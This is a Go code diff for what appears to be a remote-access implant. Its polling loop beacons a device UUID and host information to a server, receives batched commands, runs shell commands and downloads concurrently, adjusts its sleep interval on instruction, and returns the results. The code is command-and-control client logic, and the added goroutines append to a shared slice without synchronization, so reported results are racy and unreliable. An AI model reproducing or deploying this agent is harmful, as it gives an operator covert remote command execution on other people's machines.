@@ -20,7 +20,7 @@ type Result struct {
 
 type Work struct {
 	Uuid       string            `json:"uuid"`
-	Result     Result            `json:"result"`
+	Result     []Result          `json:"result"`
 	Info       utils.Information `json:"info"`
 	NextSecond int               `json:"next_second"`
 }
@@ -34,16 +34,16 @@ type Core struct {
 	info          utils.Information
 	sleep         int
 	uuid          string
+	event         []Result
 }
 
 func (c *Core) Pool() {
 
-	var r Result
 	client := &http.Client{}
 	for {
 
 		time.Sleep(time.Duration(c.sleep) * time.Second)
-		var result Action
+		var result []Action
 		data := Work{Uuid: c.uuid, Info: c.info}
 		bytesJson, err := json.Marshal(data)
 		if err != nil {
@@ -62,34 +62,45 @@ func (c *Core) Pool() {
 		if err != nil {
 			continue
 		}
-		switch result.Do {
-		case "cmd":
-			var cmd shell.Shell
-			err := json.Unmarshal([]byte(result.Data), &cmd)
-			if err != nil {
-				r = Result{Action: "cmd", Data: err.Error()}
-				break
-			}
-			r = Result{Action: "cmd", Data: cmd.ExecuteCmd()}
-		case "download":
-			var down shell.Down
+		for _, i := range result {
+			switch i.Do {
+			case "cmd":
+				var cmd shell.Shell
+				err := json.Unmarshal([]byte(i.Data), &cmd)
+				if err != nil {
 
-			err := json.Unmarshal([]byte(result.Data), &down)
-			if err != nil {
-				r = Result{Action: "download", Data: err.Error()}
+					c.event = append(c.event, Result{Action: "cmd", Data: err.Error()})
+					break
+				}
+				go func() {
+					c.event = append(c.event, Result{Action: "cmd", Data: cmd.ExecuteCmd()})
+				}()
 
-			}
-			r = Result{Action: "download", Data: down.Download()}
-		case "update":
-			// update :
-		case "sleep":
-			sleep, err := strconv.Atoi(result.Data)
-			if err == nil {
-				c.sleep = sleep
+			case "download":
+				var down shell.Down
+
+				err := json.Unmarshal([]byte(i.Data), &down)
+				if err != nil {
+					c.event = append(c.event, Result{Action: "download", Data: err.Error()})
+				}
+				go func() {
+					c.event = append(c.event, Result{Action: "download", Data: down.Download()})
+				}()
+
+			case "update":
+				// update :
+			case "sleep":
+				sleep, err := strconv.Atoi(i.Data)
+				if err == nil {
+					c.sleep = sleep
+				}
 			}
 		}
-		data = Work{Uuid: c.uuid, Result: r, Info: c.info, NextSecond: c.sleep}
+
+		data = Work{Uuid: c.uuid, Result: c.event, Info: c.info, NextSecond: c.sleep}
+		c.event = nil
 		bytesJson, err = json.Marshal(data)
+
 		if err != nil {
 			continue
 		}
@@ -101,6 +112,7 @@ func (c *Core) Pool() {
 		req.Header.Add("UA", "android")
 		resp, _ = client.Do(req)
 		_, _ = ioutil.ReadAll(resp.Body)
+
 	}
 }
 
